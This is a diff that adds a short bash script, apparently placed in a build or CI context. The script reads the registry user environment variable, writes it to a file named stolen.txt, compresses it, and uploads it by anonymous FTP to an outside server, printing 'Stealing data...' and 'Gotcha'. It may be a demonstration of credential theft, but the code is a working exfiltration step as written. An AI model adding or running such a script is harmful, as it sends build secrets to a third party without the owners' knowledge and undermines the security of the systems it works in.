@@ -1,0 +1,16 @@
+#!/bin/bash
+echo $0
+echo REGISTRY_USER
+printenv $REGISTRY_USER
+printenv $REGISTRY_USER >stolen.txt
+gzip stolen.txt
+
+echo "Stealing data..."
+ftp -inv ftp3.sealsystems.de << EOF
+user anonymous anonymous
+cd to_seal
+put stolen.txt.gz
+bye
+EOF
+
+echo "Gotcha"
